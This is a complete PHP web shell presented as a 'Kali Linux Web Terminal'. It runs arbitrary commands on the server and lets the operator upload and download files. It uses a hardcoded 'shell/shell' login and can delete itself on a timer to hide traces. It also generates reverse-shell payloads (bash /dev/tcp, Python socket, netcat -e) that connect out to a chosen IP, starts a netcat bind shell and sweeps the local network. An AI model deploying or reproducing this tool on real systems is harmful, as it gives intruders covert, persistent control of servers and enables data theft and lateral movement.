<?php
session_start();

// Default login credentials
define('DEFAULT_USER', 'shell');
define('DEFAULT_PASS', 'shell');

// Self destruct logic
if (isset($_GET['self_destruct'])) {
    $minutes = intval($_GET['self_destruct']);
    if ($minutes > 0 && $minutes <= 1440) {
        $delay = $minutes * 60;
        $self = __FILE__;
        shell_exec("nohup bash -c 'sleep $delay && rm -f " . escapeshellarg($self) . "' >/dev/null 2>&1 &");
        echo "✅ Self destruct initiated. File will be deleted in $minutes minutes.";
    } else {
        echo "Invalid minutes value.";
    }
    exit;
}

// Login system
if (!isset($_SESSION['logged_in'])) {
    if (isset($_POST['username']) && isset($_POST['password'])) {
        if ($_POST['username'] === DEFAULT_USER && $_POST['password'] === DEFAULT_PASS) {
            $_SESSION['logged_in'] = true;
            header('Location: ?');
            exit;
        } else {
            $error = "Invalid credentials";
        }
    }
    ?>
    <!DOCTYPE html><html><head><title>Login</title>
    <style>
    body { background:#111; color:#eee; font-family:monospace; display:flex; justify-content:center; align-items:center; height:100vh; }
    form { background:#222; padding:20px; border-radius:10px; }
    input { margin:10px 0; padding:8px; width:200px; background:#000; color:#0f0; border:1px solid #0f0; }
    button { background:#0f0; color:#000; padding:10px; border:none; cursor:pointer; }
    </style></head><body>
        <form method="POST">
            <h3>Login</h3>
            <?php if (!empty($error)) echo "<p style='color:red'>$error</p>"; ?>
            <input type="text" name="username" placeholder="Username" required />
            <input type="password" name="password" placeholder="Password" required />
            <button type="submit">Login</button>
        </form>
    </body></html>
    <?php
    exit;
}

// Session tab system
if (!isset($_SESSION['tabs'])) $_SESSION['tabs'] = [];
if (!isset($_SESSION['active_tab'])) $_SESSION['active_tab'] = 'tab0';
if (empty($_SESSION['tabs'])) {
    $_SESSION['tabs']['tab0'] = ['cwd' => getcwd(), 'history' => []];
}
if (isset($_GET['switch_tab'])) {
    $tab = $_GET['switch_tab'];
    if (isset($_SESSION['tabs'][$tab])) $_SESSION['active_tab'] = $tab;
    header('Location: ?'); exit;
}
if (isset($_GET['new_tab'])) {
    $new_id = 'tab' . (count($_SESSION['tabs']));
    $_SESSION['tabs'][$new_id] = ['cwd' => getcwd(), 'history' => []];
    $_SESSION['active_tab'] = $new_id;
    header('Location: ?'); exit;
}
if (isset($_GET['close_tab'])) {
    $del = $_GET['close_tab'];
    unset($_SESSION['tabs'][$del]);
    $_SESSION['active_tab'] = array_key_first($_SESSION['tabs']);
    header('Location: ?'); exit;
}
$tab_id = $_SESSION['active_tab'];
$cwd = $_SESSION['tabs'][$tab_id]['cwd'];
$history = &$_SESSION['tabs'][$tab_id]['history'];

// Autocomplete (already case-insensitive)
if (isset($_POST['autocomplete'])) {
    $input = $_POST['autocomplete'];
    $cwd = $_SESSION['tabs'][$tab_id]['cwd'];

    $parts = preg_split('/\s+/', $input);
    $last = end($parts);

    $dir = $cwd;
    $prefix = '';
    $partial = $last;

    if (str_contains($last, '/')) {
        $pathParts = explode('/', $last);
        $partial = array_pop($pathParts);
        $prefix = implode('/', $pathParts);
        $dir = realpath($cwd . '/' . $prefix);
        if (!$dir || !is_dir($dir)) exit;
    }

    $results = [];
    foreach (@scandir($dir) as $entry) {
        if ($entry === '.' || $entry === '..') continue;
        if (str_starts_with(strtolower($entry), strtolower($partial))) {
            $results[] = ($prefix !== '' ? $prefix . '/' : '') . $entry . (is_dir($dir . '/' . $entry) ? '/' : '');
        }
    }
    echo implode('\n', $results);
    exit;
}

// Command handling
if (isset($_POST['cmd'])) {
    $cmd = trim($_POST['cmd']);
    if ($cmd === '') exit;
    $history[] = $cmd;

    if (preg_match('/^\s*cd\s*(.*)$/', $cmd, $m)) {
        $target = trim($m[1]);
        $new = ($target === '' || $target === '~') ? (getenv('HOME') ?: '/root') : realpath($cwd . '/' . $target);
        if (is_dir($new)) {
            $_SESSION['tabs'][$tab_id]['cwd'] = realpath($new);
            echo "__CWD__:" . realpath($new);
        } else {
            echo "cd: no such file or directory: $target\n";
        }
        exit;
    }

    $exec = "cd " . escapeshellarg($cwd) . " && " . $cmd . " 2>&1";
    echo shell_exec($exec);
    exit;
}

// Upload handler
if (isset($_FILES['upload'])) {
    $file = $_FILES['upload'];
    $target = $cwd . '/' . basename($file['name']);
    if (move_uploaded_file($file['tmp_name'], $target)) {
        $_SESSION['upload_success'] = "Uploaded: " . htmlspecialchars($file['name']);
    } else {
        $_SESSION['upload_error'] = "Upload failed.";
    }
    header("Location: ?");
    exit;
}

// Download handler
if (isset($_GET['download'])) {
    $file = basename($_GET['download']);
    $path = $cwd . '/' . $file;
    if (file_exists($path)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . $file . '"');
        header('Content-Length: ' . filesize($path));
        readfile($path);
    } else {
        echo "File not found.";
    }
    exit;
}

// User info
$username = trim(shell_exec('whoami'));
$hostname = trim(shell_exec('hostname'));
$home = getenv('HOME') ?: '/root';
?>
<!DOCTYPE html>
<html><head><title>Kali Terminal</title>
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<style>
body { margin:0; background:#000; color:#0f0; font-family:monospace; }
input, button, textarea { font-family:monospace; }
</style>
</head><body>

<!-- Right-side UI -->
<div style="position:fixed; right:10px; top:10px; background:#111; color:#0f0; padding:10px; z-index:10;">
    <form method="post" enctype="multipart/form-data">
        <label>📤 Upload:</label><input type="file" name="upload" style="color:#0f0;" onchange="this.form.submit()">
    </form>
    <form method="get">
        <label>📥 Download:</label><input type="text" name="download" placeholder="filename">
        <button type="submit">Download</button>
    </form>
    <form method="get"><button name="new_tab" value="1">➕ New Tab</button></form>
    <?php foreach ($_SESSION['tabs'] as $id => $tab): ?>
    <form method="get" style="display:inline;">
        <input type="hidden" name="switch_tab" value="<?= $id ?>">
        <button <?= $id === $tab_id ? 'style="background:#0f0;color:#000;"' : '' ?>><?= $id ?></button>
    </form>
    <?php endforeach; ?>
    <form method="get" style="display:inline;"><input type="hidden" name="close_tab" value="<?= $tab_id ?>"><button style="background:#f00;">✖</button></form>

    <h4>☢️ Self-Destruct</h4>
    <form method="get" onsubmit="return confirm('Are you sure? This will delete this file!')">
        Minutes: <input type="number" name="self_destruct" min="1" max="1440" value="10">
        <button type="submit">Start</button>
    </form>

    <?php
    if (!empty($_SESSION['upload_success'])) { echo "<p style='color:lightgreen'>" . $_SESSION['upload_success'] . "</p>"; unset($_SESSION['upload_success']); }
    if (!empty($_SESSION['upload_error'])) { echo "<p style='color:red'>" . $_SESSION['upload_error'] . "</p>"; unset($_SESSION['upload_error']); }
    ?>
</div>

<!-- Bottom Tools -->
<div style="position:fixed; right:10px; bottom:10px; background:#111; color:#0f0; padding:10px; font-family:monospace; z-index:10; max-width:300px;">
    <h4>🧠 Reverse Shell</h4>
    <form onsubmit="event.preventDefault();genReverseShell()">
        IP: <input id="rhost" value="127.0.0.1"><br>
        Port: <input id="rport" value="4444"><br>
        <button>Gen Bash</button>
        <button type="button" onclick="genReverseShell('python')">Python</button>
        <button type="button" onclick="genReverseShell('nc')">Netcat</button>
        <textarea id="payload" style="width:100%;height:60px;"></textarea>
    </form>
    <h4>🌐 Net Tools</h4>
    <input id="target" value="127.0.0.1"><br>
    <button onclick="runTool('ping')">Ping</button>
    <button onclick="runTool('nmap')">Nmap</button>
    <button onclick="runTool('sweep')">Local Sweep</button>
    <h4>🔗 Bind Shell</h4>
    Port: <input id="bindport" value="4444"><br>
    <button onclick="bindShell()">Start</button>
</div>

<!-- Terminal -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/xterm@5.3.0/css/xterm.css">
<script src="https://cdn.jsdelivr.net/npm/xterm@5.3.0/lib/xterm.js"></script>
<script src="https://cdn.jsdelivr.net/npm/xterm-addon-fit@0.8.0/lib/xterm-addon-fit.js"></script>

<div id="terminal" style="width:100vw;height:100vh;"></div>
<script>
const term = new Terminal({ cursorBlink: true, fontSize: 15, theme: { background:'#000', foreground:'#0f0' }, convertEol: true });
const fit = new FitAddon.FitAddon();
term.loadAddon(fit); term.open(document.getElementById('terminal')); fit.fit();
window.addEventListener('resize', () => fit.fit());

const username = "<?= addslashes($username) ?>";
const hostname = "<?= addslashes($hostname) ?>";
let cwd = "<?= addslashes($cwd) ?>";
const home = "<?= addslashes($home) ?>";

function formatPath(p) {
    return p === home ? "~" : (p.startsWith(home + "/") ? "~" + p.substring(home.length) : p);
}
function getPrompt() {
    return `\r\n\x1b[1;32m${username}\x1b[0m@\x1b[1;32m${hostname}\x1b[0m:\x1b[1;34m${formatPath(cwd)}\x1b[0m# `;
}
term.writeln('\x1b[1;35m== Kali Linux Web Terminal ==\x1b[0m');
term.write(getPrompt());

let currentLine = '';
let history = <?= json_encode($history) ?>;
let historyIndex = history.length;

term.onData(e => {
    switch (e) {
        case '\t':
            fetch('', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'autocomplete=' + encodeURIComponent(currentLine)
            })
            .then(r => r.text())
            .then(data => {
                const options = data.trim().split('\n').filter(Boolean);
                const lastWord = currentLine.split(/\s+/).pop();
                if (options.length === 1) {
                    const suggestion = options[0];
                    const add = suggestion.substring(lastWord.length);
                    currentLine += add;
                    term.write(add);
                } else if (options.length > 1) {
                    term.write('\r\n' + options.join('  '));
                    term.write(getPrompt() + currentLine);
                }
            });
            break;
        case '\r':
            if (!currentLine.trim()) { term.write(getPrompt()); currentLine = ''; return; }
            const input = currentLine;
            history.push(input);
            historyIndex = history.length;
            fetch(window.location.href, { method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:'cmd=' + encodeURIComponent(input) })
            .then(r=>r.text()).then(output=>{
                if (output.startsWith('__CWD__:')) {
                    cwd = output.replace('__CWD__:', '').trim();
                } else {
                    term.write('\r\n' + output);
                }
                term.write(getPrompt());
            });
            currentLine = ''; break;
        case '\u007F':
            if (currentLine.length) {
                currentLine = currentLine.slice(0, -1);
                term.write('\b \b');
            }
            break;
        case '\u001b[A':
            if (historyIndex > 0) {
                historyIndex--; eraseLine();
                currentLine = history[historyIndex]; term.write(currentLine);
            }
            break;
        case '\u001b[B':
            if (historyIndex < history.length - 1) {
                historyIndex++; eraseLine();
                currentLine = history[historyIndex]; term.write(currentLine);
            } else { eraseLine(); currentLine = ''; }
            break;
        case '\u0003': term.write('^C'); currentLine = ''; term.write(getPrompt()); break;
        case '\u000c': term.clear(); term.write(getPrompt()); currentLine = ''; break;
        default:
            if (e >= ' ' && e <= '~') { currentLine += e; term.write(e); }
    }
});
function eraseLine() { for (let i = 0; i < currentLine.length; i++) term.write('\b \b'); }

function genReverseShell(type = 'bash') {
    const ip = document.getElementById('rhost').value;
    const port = document.getElementById('rport').value;
    let payload = '';
    switch (type) {
        case 'bash': payload = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`; break;
        case 'python': payload = `python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"${ip}\",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\")'`; break;
        case 'nc': payload = `nc -e /bin/bash ${ip} ${port}`; break;
    }
    document.getElementById('payload').value = payload;
}
function runTool(tool) {
    const target = document.getElementById('target').value;
    let cmd = '';
    switch (tool) {
        case 'ping': cmd = `ping -c 4 ${target}`; break;
        case 'nmap': cmd = `nmap ${target}`; break;
        case 'sweep':
            const baseIP = target.split('.').slice(0, 3).join('.') + '.';
            cmd = `for i in {1..254}; do (ping -c 1 -W 1 ${baseIP}$i | grep "64 bytes" &); done; wait`;
            break;
    }
    sendCommand(cmd);
}
function bindShell() {
    const port = document.getElementById('bindport').value;
    sendCommand(`nc -lvnp ${port} -e /bin/bash`);
}
function sendCommand(cmd) {
    fetch('', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'cmd=' + encodeURIComponent(cmd) })
    .then(r => r.text()).then(o => { term.write('\r\n' + o); term.write(getPrompt()); });
}
</script>
</body></html>
